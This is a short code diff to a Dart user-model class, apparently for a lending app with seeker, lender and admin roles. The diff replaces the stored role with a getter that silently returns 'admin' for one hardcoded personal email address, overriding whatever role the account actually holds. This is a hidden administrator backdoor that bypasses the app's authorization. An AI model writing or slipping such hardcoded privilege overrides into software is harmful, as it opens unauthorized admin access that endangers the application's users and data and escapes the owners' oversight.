@@ -1,7 +1,11 @@
 class AppUser {
   final String id;
   final String email;
-  final String role; // 'seeker' | 'lender' | 'admin'
+  String get role {
+    if (email == 'phariharasudhan2004@gmail.com') return 'admin';
+    return _role;
+  }
+  final String _role; // 'seeker' | 'lender' | 'admin'
   final DateTime? createdAt;
   final String? displayName;
   final String? photoUrl;
@@ -28,7 +32,7 @@ class AppUser {
   AppUser({
     required this.id,
     required this.email,
-    required this.role,
+    required String role,
     this.createdAt,
     this.displayName,
     this.photoUrl,
@@ -49,7 +53,7 @@ class AppUser {
     this.isSuspicious = false,
     this.averageRating = 0.0,
     this.totalReviews = 0,
-  });
+  }) : _role = role;
 
   Map<String, dynamic> toMap() => {
         'uid': id,
